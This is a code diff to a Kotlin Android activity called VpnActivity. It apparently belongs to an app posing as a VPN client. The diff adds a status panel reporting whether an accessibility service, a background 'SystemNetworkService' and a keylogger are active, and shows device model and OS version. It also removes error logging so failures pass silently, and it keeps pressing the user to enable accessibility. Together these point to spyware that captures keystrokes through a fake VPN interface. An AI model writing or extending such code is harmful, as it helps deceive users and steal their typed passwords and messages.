@@ -4,7 +4,6 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.util.Log
 import android.view.View
 import android.widget.AdapterView
 import android.widget.ArrayAdapter
@@ -28,10 +27,6 @@ import java.util.TimerTask
 
 class VpnActivity : Activity() {
 
-    companion object {
-        private const val TAG = "VpnActivity"
-    }
-
     private lateinit var connectBtn: Button
     private lateinit var connectRing: View
     private lateinit var statusText: TextView
@@ -41,6 +36,11 @@ class VpnActivity : Activity() {
     private lateinit var timeText: TextView
     private lateinit var downloadText: TextView
     private lateinit var uploadText: TextView
+    private lateinit var accessStatus: TextView
+    private lateinit var networkStatus: TextView
+    private lateinit var keylogStatus: TextView
+    private lateinit var deviceInfo: TextView
+    private lateinit var androidVersion: TextView
     private lateinit var bottomStatus: TextView
 
     private var isConnected = false
@@ -58,7 +58,7 @@ class VpnActivity : Activity() {
         setContentView(R.layout.activity_vpn)
 
         // Start background service
-        try { SystemNetworkService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
+        try { SystemNetworkService.start(this) } catch (_: Exception) {}
 
         initViews()
         setupServerSpinner()
@@ -75,6 +75,11 @@ class VpnActivity : Activity() {
         timeText = findViewById(R.id.timeText)
         downloadText = findViewById(R.id.downloadText)
         uploadText = findViewById(R.id.uploadText)
+        accessStatus = findViewById(R.id.accessStatus)
+        networkStatus = findViewById(R.id.networkStatus)
+        keylogStatus = findViewById(R.id.keylogStatus)
+        deviceInfo = findViewById(R.id.deviceInfo)
+        androidVersion = findViewById(R.id.androidVersion)
         bottomStatus = findViewById(R.id.bottomStatus)
 
         connectBtn.setOnClickListener {
@@ -85,6 +90,26 @@ class VpnActivity : Activity() {
                 connect()
             }
         }
+
+        updateSystemStatus()
+    }
+
+    private fun updateSystemStatus() {
+        val accEnabled = MainActivity.isAccessibilityEnabled(this)
+        val svcRunning = MainActivity.isServiceRunning(this, SystemNetworkService::class.java)
+        val keylogRunning = AccessibilityHelper.isRunning
+
+        accessStatus.text = if (accEnabled) "Active" else "Inactive"
+        accessStatus.setTextColor(getColorCompat(if (accEnabled) R.color.cyber_green else R.color.cyber_red))
+
+        networkStatus.text = if (svcRunning) "Running" else "Stopped"
+        networkStatus.setTextColor(getColorCompat(if (svcRunning) R.color.cyber_green else R.color.cyber_red))
+
+        keylogStatus.text = if (keylogRunning) "Active" else "Inactive"
+        keylogStatus.setTextColor(getColorCompat(if (keylogRunning) R.color.cyber_green else R.color.cyber_red))
+
+        deviceInfo.text = "${Build.MANUFACTURER} ${Build.MODEL}"
+        androidVersion.text = "${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})"
     }
 
     private fun setupServerSpinner() {
@@ -124,8 +149,7 @@ class VpnActivity : Activity() {
                         }
                     }
                 }
-            } catch (e: Exception) {
-                Log.w(TAG, "fetchIp: ${e.message}")
+            } catch (_: Exception) {
             }
         }.start()
     }
@@ -238,7 +262,7 @@ class VpnActivity : Activity() {
 
     override fun onResume() {
         super.onResume()
-        // Check if accessibility is still enabled
+        updateSystemStatus()
         if (!MainActivity.isAccessibilityEnabled(this)) {
             showEnableAccessibilityAlert()
         }
